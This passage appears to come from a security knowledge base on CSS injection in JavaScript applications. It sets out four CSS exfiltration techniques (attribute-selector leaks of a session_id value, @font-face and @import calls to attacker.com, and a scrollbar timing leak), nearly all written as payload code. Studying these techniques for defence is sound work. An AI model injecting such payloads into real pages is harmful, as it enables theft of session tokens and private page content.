---
source: "languages/javascript/css-injection.md"
title: "CSS Injection and Data Exfiltration"
category: "language-vuln"
language: "javascript"
chunk: 6
total_chunks: 8
heading: "CSS Exfiltration Techniques"
---

## CSS Exfiltration Techniques

### Technique 1: Attribute Value Extraction

```css
/* Extract value of hidden input fields */
input[name="session_id"][value^="a"] { background: url(/leak?a); }
input[name="session_id"][value^="b"] { background: url(/leak?b); }
/* ... 52 characters (a-zA-Z) × value length requests */
```

### Technique 2: Font-Based Leak (CSS Font Loading)

```css
/* Check if specific text exists using @font-face */
@font-face {
  font-family: 'leak-a';
  src: url(http://attacker.com/leak?exists=admin);
  unicode-range: U+41;  /* 'A' */
}

/* Apply font to target element */
body { font-family: 'leak-a', sans-serif; }
/* Browser downloads the font if 'A' is rendered -> existence confirmed */
```

### Technique 3: Scrollbar-Based Leak

```css
/* Detect content overflow with custom scrollbar */
#target:has(> :nth-child(100)) {
  scrollbar-width: thin;
  /* Attacker observes timing difference from scrollbar rendering */
}
```

### Technique 4: @import Redirect Chain

```css
/* Use sequential @import to test each character */
@import url('http://attacker.com/check?pos=1');
/* Server responds with CSS for testing position 2 based on result */
```

---